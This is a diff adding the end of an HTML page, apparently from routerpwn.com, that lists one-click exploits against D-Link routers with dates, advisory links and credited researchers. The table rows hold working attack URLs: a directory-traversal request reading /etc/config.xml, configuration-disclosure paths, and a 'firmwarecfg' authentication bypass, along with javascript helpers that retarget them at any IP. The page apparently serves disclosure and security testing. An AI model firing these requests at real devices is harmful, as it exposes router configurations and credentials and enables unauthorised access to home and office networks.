+           <a href="http://www.eazel.es/202020/06/10/d-link-dsl-g624t-several-vulnerabilities/">
+            Eazel.es
+           </a>
+          </td>
+          <td>
+           <a href="javascript:dslg624t_dirtraversal()">
+            DSL-G624T DSL-G604T directory traversal
+           </a>
+           <a href="javascript:dslg624t_dirtraversal(ip)" onclick="return ip=prompt('IP:');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Jose Palanco
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2006/10/20
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.eazel.es/202020/06/10/d-link-dsl-g624t-several-vulnerabilities/">
+            Eazel.es
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/cgi-bin/webcm?getpage=/../../../../../../../etc/config.xml">
+            DSL-G624T DSL-G604T configuration disclosure
+           </a>
+           <a href="javascript:setip('/cgi-bin/webcm?getpage=/../../../../../../../etc/config.xml')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Jose Palanco
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2006/06/06
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.intruders.org.br/advisories/dlinkpt.txt">
+            Intruders.org.br
+           </a>
+          </td>
+          <td>
+           <a href="http://10.0.0.1/cgi-bin/config.cfg">
+            DWL-7x00AP configuration disclosure
+           </a>
+           <a href="javascript:setip('/cgi-bin/config.cfg')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Intruders Tiger Team
+          </td>
+         </tr>
+         <tr>
+          <td>
+           2005/05/20
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://seclists.org/fulldisclosure/2005/May/468">
+Full Disclosure
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.0.1/cgi-bin/firmwarecfg">
+            DSL-502T DSL-504T DSL-562T DSL-G604T "firmwarecfg" Authentication Bypass
+           </a>
+           <a href="javascript:setip('/cgi-bin/firmwarecfg')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Francesco Orro
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </section>
+      <script>
+       $(document).ready(function() {
+    $('#tabla').dataTable( {
+        "order": [[ 0, "desc" ]]
+    } );
+} );
+      </script>
+      <script type="text/javascript">
+       var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script>
+      <script type="text/javascript">
+       try {
+var pageTracker = _gat._getTracker("UA-16172640-1");
+pageTracker._trackPageview();
+} catch(err) {}
+      </script>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ <script src="http://www.routerpwn.com/includes/scripts.js"></script></body>
+</html>
